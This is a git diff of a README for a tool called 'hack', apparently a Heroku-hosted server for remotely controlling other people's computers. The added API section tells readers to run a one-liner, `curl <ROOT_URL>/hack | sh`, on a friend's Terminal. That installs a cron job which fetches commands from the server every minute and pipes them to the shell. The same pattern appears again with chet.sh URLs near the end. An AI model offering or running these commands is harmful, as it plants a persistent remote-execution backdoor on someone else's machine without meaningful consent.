@@ -2,7 +2,7 @@
 
 ## Getting Started
 
-Clone, install, link:
+Clone, install, and link so you can use the `hack` cli tool.
 
 ```sh
 git clone https://github.com/ccorcos/hack.git
@@ -11,26 +11,60 @@ npm install
 npm link
 ```
 
-Setup Heroku:
+If you've never used Heroku before, [signup here](https://signup.heroku.com/) (it's free!) and set up their cli tool on your machine.
 
 ```sh
 brew install heroku-toolbelt
 heroku login
+```
+
+Create a Heroku app with an easy name to remember.
+
+```sh
 heroku create hacker-chet
-echo "ROOT_URL=$(heroku info -s | grep web-url | cut -d= -f2)" >> .env
 ```
 
-Run locally:
+The following command will get the root url for your Heroku webside and put it in your package.json. This way the server knows what to inject into the shell scripts.
 
 ```sh
-npm start # alias for `heroku local web`
+npm run init
 ```
 
-Deploy to Heroku:
+You can stand up the server locally if you want do you can hack yourself and test things out.
 
 ```sh
-npm run deploy # alias for `git push origin heroku`
+npm start
 ```
+
+Or you can deploy to Heroku.
+
+```sh
+npm run deploy
+```
+
+Now you're ready to hack!
+
+## API
+
+The beauty of this program is that to start hacking someone, its just a one-liner!
+
+```sh
+curl <ROOT_URL>/hack | sh
+```
+
+`ROOT_URL` is the specific path to your application. When you're testing locally, this will be `localhost:5000` and when you deploy to heroku, it will be something like `<APP_NAME>.herokuapp.com`.
+
+What this does is sets up a cron job to ping the /env/live endpoint every minute and pipes the result to `sh`. Pretty sweet right! And Heroku gives you HTTPS for free so I wouldn't be too worried about hacking yourself with it.
+
+So once you've hacked your friend, you can do everything else with the commandline tool from your computer.
+
+
+
+
+
+
+
+
 
 
 - dump endpoint
@@ -94,7 +128,7 @@ heroku config:set HEROKU_URL=$(heroku info -s | grep web-url | cut -d= -f2)
 
 
 
-
+git
 Start hacking someone by running this command from their Terminal: `curl -Ls chet.sh/hack | sh`. That sets up a cron job every minute which pings `curl chet.sh/live | sh`.
 
 Now go to your commandline and we can start having some fun.
